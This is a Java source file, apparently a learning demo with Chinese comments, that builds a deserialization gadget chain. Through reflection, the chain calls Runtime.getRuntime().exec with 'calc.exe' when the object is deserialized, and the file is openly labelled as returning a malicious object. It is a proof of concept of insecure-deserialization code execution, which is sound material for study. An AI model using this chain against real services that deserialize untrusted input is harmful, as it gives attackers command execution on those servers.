package com.test.example2;

import java.io.*;

public class ReflectionPlay implements Serializable {

    public static void main(String[] args) throws Exception {
        new ReflectionPlay().run();
    }

    public void run() throws Exception {
        byte[] ObjectBytes = serialize(GetExp());
        deserialize(ObjectBytes);
    }

    //在此方法中返回恶意对象
    public Object GetExp() {
        String command = "calc.exe";
        Object firstObject = Runtime.class;
        ReflectionObject[] reflectionChains = {
                //调用 Runtime.class 的getMethod方法,寻找 getRuntime方法，得到一个Method对象(getRuntime方法)
                //等同于 Runtime.class.getMethod("getRuntime",new Class[]{String.class,Class[].class})
                new ReflectionObject("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                //调用 Method 的 invoker 方法可以得到一个Runtime对象
                // 等同于 method.invoke(null),静态方法不用传入对象
                new ReflectionObject("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                //调用RunTime对象的exec方法,并将 command作为参数执行命令
                new ReflectionObject("exec", new Class[]{String.class}, new Object[]{command})
        };
        return new ReadObject(new ReflectionChains(firstObject, reflectionChains));
    }

    /*
     * 序列化对象到byte数组
     * */
    public byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }

    /*
     * 从byte数组中反序列化对象
     * */
    public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }

}